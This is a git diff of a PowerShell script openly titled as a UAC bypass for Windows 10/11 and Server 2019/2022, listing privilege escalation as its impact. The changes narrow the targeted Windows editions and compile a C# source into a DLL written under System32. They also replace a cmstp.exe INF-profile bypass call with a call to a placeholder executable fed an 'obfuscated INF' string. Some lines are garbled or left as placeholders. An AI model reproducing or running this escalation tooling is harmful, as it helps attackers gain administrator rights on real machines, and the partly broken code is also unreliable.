@@ -1,8 +1,6 @@
 # Author: P.Hoogeveen | aka: x0xr00t | Team: Sl0ppyRoot
 # Name: UAC Bypass for Windows 10 and Server 2019/2022
-# The main .ps1 file been re-dev by dev: @keytrap-x86 (partial, os version check) Thanks sir (Y)
 # Build: 20241007
-# Name: UAC Bypass Win Server 2019| Win Server 2022 | Win 10 | Win 11 | win 12 pre-release
 # Impact: Privilege Escalation
 # Method: DllReflection and CMSTP Bypass
 
@@ -36,26 +34,12 @@ $supportedVersions = @(
     "Windows 10 Pro",
     "Windows 10 Education",
     "Windows 10 Enterprise",
-    "Windows 10 Enterprise 2015",
-    "Windows 10 Mobile and Mobile Enterprise",
-    "Windows 10 IoT Core",
-    "Windows 10 IoT Enterprise LTSC 2021",
-    "Windows 10 IoT Mobile Enterprise",
     "Windows Server 2019 Standard",
     "Windows Server 2019 Datacenter",
-    "Windows Server 2019 Essentials",
-    "Windows Server 2019 Azure Core",
     "Windows Server 2022 Standard",
     "Windows Server 2022 Datacenter",
-    "Windows Server 2022 Azure Core",
     "Windows 11 Home",
-    "Windows 11 Pro",
-    "Windows 11 Education",
-    "Windows 11 Enterprise",
-    "Windows 11 IoT Enterprise",
-    "Windows 11 IoT Mobile Enterprise",
-    "Windows 11 Team",
-    "Windows 11 Enterprise Multi-session"
+    "Windows 11 Pro"
 )
 
 if ($supportedVersions -notcontains $OSVersion) {
@@ -69,11 +53,7 @@ if ($supportedVersions -notcontains $OSVersion) {
 $mockFolderPath = "C:\Windows\System32\MockFolder"
 if (-not (Test-Path $mockFolderPath)) {
     New-Item -Path $mockFolderPath -ItemType Directory | Out-Null
-    Write-Host "Mock folder created at $mockFolderPath."
-}
-
-# Compiling DLLs
-Write-Host " Compiling DLL files..."
+    Write-Host "Mock folder creatediling DLL files..."
 Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\sl0puacb.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "$mockFolderPath\sl0p.dll"
 Write-Host "DLL files created."
 
@@ -98,11 +78,10 @@ if (-not $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administ
     exit
 }
 
-# Call CMSTP Bypass if applicable
-if ($OSVersion -match "Windows 10|Windows 11|Windows Server 2019|Windows Server 2022") {
-    Write-Host "Executing CMSTP bypass..."
-    Start-Process "cmstp.exe" -ArgumentList "/s", "C:\Path\To\Your\CMSTPProfile.inf"
-}
+# Call C# Executable
+$payloadCommand = "runlegacyexplorer.exe"
+$obfuscatedInf = "Your obfuscated INF string here" # Replace with actual obfuscated INF logic
+& "C:\Path\To\Your\CSharpExecutable.exe" $payloadCommand $obfuscatedInf # Call the C# executable with parameters
 
 # Display Group Policy Results
 Write-Host "Getting user scope..."
@@ -115,3 +94,4 @@ Write-Host "Getting LUA Settings..."
 Get-ItemProperty HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system
 
 Write-Host "________________________"
+
